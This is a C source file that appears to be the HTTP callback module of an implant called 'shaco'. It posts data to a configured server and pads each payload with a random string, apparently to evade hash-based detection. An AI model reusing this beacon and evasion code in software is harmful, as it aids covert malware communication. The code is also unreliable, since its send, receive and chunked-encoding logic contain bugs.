#include "Http.h"
#include "../Common/Network.h"
#include "../Common/shaco_stdlib.h"
#include "../Config/Settings.h"

#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdio.h>

#define MAX_HEADER_SIZE 8000

#define MAX_RECV_SIZE 1024

PHTTP_RESPONSE shaco_http_post(void *postfield, uint64_t postfield_size);
int connect_server(char ip[], uint32_t port);
bool send_all(int fd, uint8_t *buffer, uint64_t size);
bool recv_all(int fd, uint8_t **buffer, uint64_t *size);
PHTTP_RESPONSE http_send(char ip[], int port, char *header, void *postfield, uint64_t postfield_size);
PHTTP_RESPONSE http_post( void *postfield, uint64_t postfield_size);
void http_free(PHTTP_RESPONSE resp);

const char *POST_HEADER_FORMAT = "%s %s HTTP/1.1\r\n"
                            "Host: %s:%d\r\n"
                            "Content-Type: text/plain\r\n"
                            "User-Agent: %s\r\n"
                            "Content-Length: %zu\r\n"
                            "Connection: close\r\n"
                            "\r\n";

//change hash to dificult rules...
PHTTP_RESPONSE shaco_http_post(void *postfield, uint64_t postfield_size) {
    PHTTP_RESPONSE resp;
    char *random_str = generate_random_str(generate_random_int(5, 30));
    size_t newsize = postfield_size + StringLength(random_str);
    void *new_postfield = MemCat(postfield, postfield_size, random_str, StringLength(random_str));
    if(new_postfield){
        resp = http_post(new_postfield, newsize);
        shaco_free(new_postfield);
    }else{
        resp = http_post(postfield, postfield_size);
    }
    return resp;
}

int connect_server(char ip[], uint32_t port){
    int sock = -1;
    struct sockaddr_in addr = {};
    ZeroMemory(&addr, sizeof(struct sockaddr_in));

    sock = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
    if(sock == -1) return -1;
    addr.sin_addr.s_addr = s_inet_addr(ip);
    addr.sin_family = AF_INET;
    addr.sin_port = s_htons(port);

    if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1) { close(sock); return -1; };
    return sock;
}

bool send_all(int fd, uint8_t *buffer, uint64_t size){
    if(fd < 0) return false;
    uint64_t sent = 0, res = 0;
    while(sent < size){
        res = send(fd, buffer, size, 0);
        if(res == -1){
            close(fd);
            return false;
        }
        sent += res;
    }
    return true;
}

bool recv_all(int fd, uint8_t **buffer, uint64_t *size){
    if(fd < 0 || !size) return false;
    bool success = true;
    int res = 0;
    uint64_t current = 0;
    void *tmp = NULL;
    *buffer = shaco_malloc(MAX_RECV_SIZE + 1);
    while((res = recv(fd,*buffer + current, MAX_RECV_SIZE, 0)) > 0){
        tmp = shaco_realloc(*buffer, (current += res) );
        if(!tmp) {MSG("Error in allocation"); return false;}
        *buffer = tmp;
    }
    if(res == -1) success = false;
    *size = current;
    return success;
}



PHTTP_RESPONSE http_send(char ip[], int port, char *header, void *postfield, uint64_t postfield_size) {

    int sockfd = -1;

    sockfd = connect_server(ip,port);
    if(sockfd < 0) return NULL;
   

    if(!send_all(sockfd, (uint8_t *)header, StringLength(header))) return NULL;

    if(postfield != NULL)
        if(!send_all(sockfd, (uint8_t *)postfield, postfield_size)) return NULL;

    uint8_t *buffer = NULL;
    uint64_t received = 0;

    if(recv_all(sockfd, &buffer, &received) != false)
        close(sockfd);

    if(received <= 0){ MSG("no value from server"); return NULL;}

    size_t size = 0;
    char *_header = StrStrN((char *)buffer, "\r\n\r\n", &size);

    if(!_header){
        MSG("can't get header");
        shaco_free(buffer);
        return NULL;
    }

    int status = 0;
    if( StringCompare((char *)buffer, "HTTP/1.") == 0)
        sscanf((char *)buffer, "HTTP/1.%*d %d", &status);
    
    bool chunked = false;
    StrStr((char *)buffer, "Transfer-Encoding: chunked\r\n");
    if(buffer != NULL) chunked = true;

    PHTTP_RESPONSE response = NULL;
    response = (PHTTP_RESPONSE)shaco_calloc(sizeof(HTTP_RESPONSE), 1);
    if(!response) { shaco_free(buffer); return NULL; }

    response->status = status;
    response->size = received - size - 4 ;
    response->response = (uint8_t *)_header + 4 ;
    response->buffer = buffer;
    response->buffer_size = received;

    if(!chunked)
        return response;

    //TODO: implement chunked parse
    return response;
}


PHTTP_RESPONSE http_post( void *postfield, uint64_t postfield_size) {

    if(!postfield)
        return NULL;

    PSETTINGS sett = get_settings();
    char post_header[MAX_HEADER_SIZE];
    uint64_t len_header = snprintf(post_header, MAX_HEADER_SIZE, POST_HEADER_FORMAT, "POST", sett->endpoint, sett->domain , sett->port, sett->useragent, postfield_size);
    return http_send(sett->ip,sett->port,post_header,postfield,postfield_size);
}


void http_free(PHTTP_RESPONSE resp){
    if(!resp) return;
    ZeroMemory(resp->buffer, resp->size);
    shaco_free(resp->buffer);
    ZeroMemory(resp, sizeof(HTTP_RESPONSE));
    shaco_free(resp);
    resp = NULL;
}
